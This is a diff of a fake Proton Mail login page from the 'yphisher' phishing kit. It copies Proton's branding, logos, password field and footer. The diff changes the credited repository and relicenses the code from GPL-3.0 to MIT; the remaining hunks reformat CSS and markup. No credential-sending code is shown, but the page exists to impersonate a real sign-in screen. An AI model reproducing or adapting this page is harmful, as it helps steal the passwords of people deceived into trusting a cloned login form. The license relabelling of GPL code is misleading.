@@ -1,9 +1,9 @@
 <!-- 
     Warning: This is just a Fake Page. Beaware of Phishing!
-    Learn More: https://github.com/htr-tech/yphisher#disclaimer
+    Learn More: https://github.com/Yashdon999/yphisher#disclaimer
 
-    Page Source: https://github.com/htr-tech/yphisher
-    GPL-3.0 license (Don't Copy paste without credits)
+    Page Source: https://github.com/Yashdon999/yphisher
+    MIT license (Don't Copy paste without credits)
 -->
 
 <!DOCTYPE html>
@@ -300,40 +300,40 @@
     }
     
     html {
-        quotes: "“""”""‘""’"
+        quotes: "“" "”" "‘" "’"
     }
     
-    :lang(fr) {
-        quotes: "« "" »""“""”""‘""’"
+     :lang(fr) {
+        quotes: "« " " »" "“" "”" "‘" "’"
     }
     
-    :lang(en) {
-        quotes: "“""”""‘""’"
+     :lang(en) {
+        quotes: "“" "”" "‘" "’"
     }
     
-    :lang(es) {
-        quotes: "«""»""“""”"
+     :lang(es) {
+        quotes: "«" "»" "“" "”"
     }
     
-    :lang(it) {
-        quotes: "« "" »""“""”"
+     :lang(it) {
+        quotes: "« " " »" "“" "”"
     }
     
-    :lang(de) {
-        quotes: "„""“""‚""‘"
+     :lang(de) {
+        quotes: "„" "“" "‚" "‘"
     }
     
-    :lang(ja) {
-        quotes: "「""」""『""』"
+     :lang(ja) {
+        quotes: "「" "」" "『" "』"
     }
     
-    :lang(ar) {
-        quotes: "“""”"
+     :lang(ar) {
+        quotes: "“" "”"
     }
     
     *,
-    :after,
-    :before {
+     :after,
+     :before {
         box-sizing: inherit
     }
     
@@ -347,7 +347,7 @@
         min-height: 100%
     }
     
-    ::selection {
+     ::selection {
         background-color: var(--selection-background-color);
         color: var(--selection-text-color)
     }
@@ -401,7 +401,7 @@
     }
     
     .ui-standard,
-    :root {
+     :root {
         --signal-danger-hover: var(--signal-danger-major-1);
         --signal-danger-active: var(--signal-danger-major-2);
         --signal-warning-hover: var(--signal-warning-major-1);
@@ -416,7 +416,7 @@
         --interaction-weak-active: var(--interaction-weak-major-2)
     }
     
-    :root {
+     :root {
         --1px: .0625rem;
         --border-radius-sm: calc(var(--border-radius)*0.5*var(--1px));
         --border-radius-md: calc(var(--border-radius)*var(--1px));
@@ -426,7 +426,7 @@
     }
     
     .ui-standard,
-    :root {
+     :root {
         --link-norm: var(--optional-link-norm, var(--interaction-norm));
         --link-hover: var(--optional-link-hover, var(--interaction-norm-hover));
         --link-active: var(--optional-link-active, var(--interaction-norm-active));
@@ -494,7 +494,7 @@
         color: var(--text-norm)
     }
     
-    :root {
+     :root {
         --font-weight-normal: 400;
         --font-weight-semibold: 600;
         --font-weight-bold: 700
@@ -552,7 +552,7 @@
     }
     
     .placeholder,
-    ::placeholder {
+     ::placeholder {
         color: var(--field-placeholder-color);
         font-style: normal;
         opacity: 1
@@ -777,28 +777,28 @@
         width: var(--label-width, 18em)
     }
     
-    ::-webkit-scrollbar {
+     ::-webkit-scrollbar {
         height: .625rem;
         width: .625rem
     }
     
-    ::-webkit-scrollbar-thumb {
+     ::-webkit-scrollbar-thumb {
         background-clip: padding-box;
         background-color: var(--scrollbar-thumb-color);
         border: .125rem solid transparent;
         border-radius: .3125rem
     }
     
-    ::-webkit-scrollbar-track {
+     ::-webkit-scrollbar-track {
         background-color: transparent
     }
     
-    ::-webkit-scrollbar-thumb:horizontal:hover,
-    ::-webkit-scrollbar-thumb:vertical:hover {
+     ::-webkit-scrollbar-thumb:horizontal:hover,
+     ::-webkit-scrollbar-thumb:vertical:hover {
         background-color: var(--scrollbar-thumb-hover-color)
     }
     
-    ::-webkit-scrollbar-corner {
+     ::-webkit-scrollbar-corner {
         visibility: hidden
     }
     
@@ -810,8 +810,8 @@
     
     @media(prefers-reduced-motion:reduce) {
         *,
-        :after,
-        :before {
+         :after,
+         :before {
             animation-delay: 1ms !important;
             animation-duration: .001ms !important;
             animation-iteration-count: 1 !important;
@@ -1719,14 +1719,13 @@
                     </a>
                 </div>
                 <button class="button button-small button-outline-norm inline-block text-center flex flex-align-items-center flex-nowrap max-w100 ml1" aria-busy=false aria-expanded=false data-testid=dropdown-button type=button>
-                    <svg viewBox="0 0 16 16"
-                        class="icon-16p mr0-5 flex-item-noshrink no-tiny-mobile" role=img focusable=false
-                        aria-hidden=true>
+                    <svg viewBox="0 0 16 16" class="icon-16p mr0-5 flex-item-noshrink no-tiny-mobile" role=img
+                        focusable=false aria-hidden=true>
                         <use xlink:href=#ic-globe></use>
                     </svg>
                     <span class=text-ellipsis>English</span>
-                    <svg viewBox="0 0 16 16"
-                        class="icon-16p flex-item-noshrink ml0-5" role=img focusable=false aria-hidden=true>
+                    <svg viewBox="0 0 16 16" class="icon-16p flex-item-noshrink ml0-5" role=img focusable=false
+                        aria-hidden=true>
                         <use xlink:href=#ic-chevron-down-filled></use>
                     </svg>
                 </button>
@@ -1763,7 +1762,8 @@
                                                         viewBox="0 0 16 16" class="icon-16p mauto" role=img
                                                         focusable=false aria-hidden=true>
                                                         <use xlink:href=#ic-eye></use>
-                                                    </svg></button></div>
+                                                    </svg></button>
+                                            </div>
                                         </div>
                                     </div>
                                     <div class="field-two-assist flex flex-nowrap flex-align-items-start" id=id-4></div>
@@ -1823,7 +1823,8 @@
                                         </radialgradient>
                                     </defs>
                                     <title id=logo-8-title>Proton Mail</title>
-                                </svg></div>
+                                </svg>
+                            </div>
                             <div class="inline-block mx0-5 on-mobile-m0 on-tiny-mobile-max-w50p" title="Proton Calendar"><svg xmlns=http://www.w3.org/2000/svg xmlns:xlink=http://www.w3.org/1999/xlink viewBox="0 0 36 36" width=36 height=36 fill=none class="logo icon-48p glyph-only" aria-labelledby=logo-9-title>
                                     <path fill=url(#logo-9-a)
                                         d="M7 6a3 3 0 0 0-3 3v1l1 1v17l20-10 1 1h6V9a3 3 0 0 0-3-3H7Z"></path>
@@ -1873,7 +1874,8 @@
                                         </lineargradient>
                                     </defs>
                                     <title id=logo-10-title>Proton Drive</title>
-                                </svg></div>
+                                </svg>
+                            </div>
                             <div class="inline-block mx0-5 on-mobile-m0 on-tiny-mobile-max-w50p" title="Proton VPN"><svg xmlns=http://www.w3.org/2000/svg xmlns:xlink=http://www.w3.org/1999/xlink viewBox="0 0 36 36" width=36 height=36 fill=none class="logo icon-48p glyph-only" aria-labelledby=logo-11-title>
                                     <path fill=url(#logo-11-a) fill-rule=evenodd
                                         d="M15.247 29.149c1.064 1.913 3.797 2.017 5.005.19l11.265-17.035c1.195-1.806.052-4.228-2.111-4.475L7.263 5.31c-2.36-.269-4.041 2.22-2.893 4.285l.09.16 9.88 6.77-.12 10.77 1.027 1.854Z"
@@ -1908,7 +1910,8 @@
                             policy</a></span><span class="color-border pl0-75 pr0-75 no-tiny-mobile" aria-hidden=true>|</span><span class=no-tiny-mobile>Version 5.0.16.2</span></div>
             </footer>
             <div class="fixed m2 mb1-5 bottom right on-tablet-m0 on-tablet-mb1 on-tablet-text-center on-tablet-static on-tiny-mobile-text-sm">
-                <button type=button class="support-dropdown-button mlauto mrauto link" aria-expanded=false aria-describedby=dropdown-13>Need help?</button></div>
+                <button type=button class="support-dropdown-button mlauto mrauto link" aria-expanded=false aria-describedby=dropdown-13>Need help?</button>
+            </div>
             <p data-testid=layout-footer:version-text class="hidden auto-tiny-mobile text-center text-sm m0-5 mb1 sf-hidden">Version 5.0.16.2</p>
         </div>
     </div>
